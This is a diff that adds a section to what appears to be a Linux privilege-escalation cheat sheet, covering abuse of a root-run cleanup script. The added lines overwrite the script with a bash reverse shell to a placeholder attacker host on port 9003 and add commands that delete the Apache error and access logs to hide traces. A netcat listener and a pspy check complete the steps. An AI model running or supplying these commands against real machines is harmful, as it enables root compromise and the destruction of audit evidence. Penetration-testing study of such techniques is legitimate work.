@@ -1348,6 +1348,31 @@ ls -la /tmp/rootbash
 id
 ```
 
+#### Suid copy weirdness
+Confirm execution with `pspy` if the payload does not appear:
+
+```bash
+./pspy64
+# UID=0 | /bin/bash /var/www/cleanup.sh
+```
+
+If SUID copy payloads behave oddly or the target path is mounted with restrictive options, switch to a reverse shell payload in the root-run script:
+
+```bash
+cat > /var/www/cleanup.sh << 'EOF'
+#!/bin/bash
+sh -i >& /dev/tcp/ATTACKER_IP/9003 0>&1
+rm -rf /var/log/apache2/error.log
+rm -rf /var/log/apache2/access.log
+EOF
+```
+
+Then wait with:
+
+```bash
+nc -nlvp 9003
+```
+
 ### Cron Jobs Path Environment Variable
 
 * View the contents of the system-wide crontab:
